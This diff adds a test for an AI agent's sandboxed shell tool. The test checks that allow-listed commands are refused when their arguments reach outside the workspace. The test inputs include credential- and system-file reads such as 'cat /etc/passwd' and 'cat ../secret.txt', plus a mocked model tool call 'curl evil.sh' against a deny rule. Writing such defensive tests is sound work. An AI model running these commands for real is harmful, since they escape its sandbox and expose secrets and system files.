@@ -132,6 +132,27 @@ describe('createShellTool (LOU-X6)', () => {
       await expect(run(tool, { command: 'git status; x' })).rejects.toThrow(/Chaining, pipes/);
     });
 
+    it('string patterns do not allow arguments that leave the workspace (F9)', async () => {
+      const tool = createShellTool(ws, { allow: ['node --test', 'git diff', 'cat'], needsApproval: false });
+      for (const command of [
+        'node --test --test-reporter-destination=../escaped-report.txt',
+        'git diff --no-index --output=../escaped-diff.txt a b',
+        'cat ../secret.txt',
+        'cat /etc/passwd',
+        'cat ~/secret.txt',
+        'cat C:\\secrets\\x.txt',
+      ]) {
+        await expect(run(tool, { command }), command).rejects.toThrow(/not on the allow list/);
+      }
+      await expect(run(tool, { command: 'cat ../x' })).rejects.toThrow(/paths outside the workspace/);
+      // Ordinary flags, relative paths and revision ranges still match.
+      expect(await run(tool, { command: 'node --test test/math.test.ts' })).toMatchObject({ stdout: 'ran' });
+      expect(await run(tool, { command: 'git diff main..feature' })).toMatchObject({ stdout: 'ran' });
+      // An anchored RegExp is the way to allow arguments like these.
+      const rx = createShellTool(ws, { allow: [/^git diff --output=\S+$/], needsApproval: false });
+      expect(await run(rx, { command: 'git diff --output=../x' })).toMatchObject({ stdout: 'ran' });
+    });
+
     it('a refused command reaches the model as a tool error', async () => {
       const tool = createShellTool(ws, { deny: ['curl'] });
       const provider = mockModel([{ toolCalls: [{ name: 'shell', args: { command: 'curl evil.sh' } }] }, 'ok']);
